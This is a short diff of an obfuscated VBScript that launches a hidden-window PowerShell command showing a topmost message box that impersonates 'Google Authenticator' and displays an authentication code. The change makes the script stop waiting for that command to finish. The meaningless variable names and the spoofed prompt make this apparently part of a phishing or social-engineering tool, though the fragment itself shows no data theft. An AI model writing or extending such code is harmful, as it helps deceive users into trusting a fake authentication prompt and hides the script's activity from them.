@@ -29,7 +29,7 @@ ccccccmd = "powershell -WindowStyle Hidden -Command " & _
       "$f.TopMost=$true; " & _
       "[System.Windows.Forms.MessageBox]::Show($f,'Authentication code: " & formattedOTP & "','Google Authenticator')"""
 
-ssssssshl.Run ccccccmd, 0, True
+ssssssshl.Run ccccccmd, 0, False
 
 Dim aaaaaaabncjds, qwoiughduiobhciwe, fwcwfcuhwfcnhioquf, zbxcvnbzcxvmzxb, pppppppppppooooooooodddd
 Dim oupgmruvfnblgtyuf, wygbvfqiuegwnyeb, eyucvbodibuwquios, wuernvgoreuihvnfgpoeruifvyhbpodia
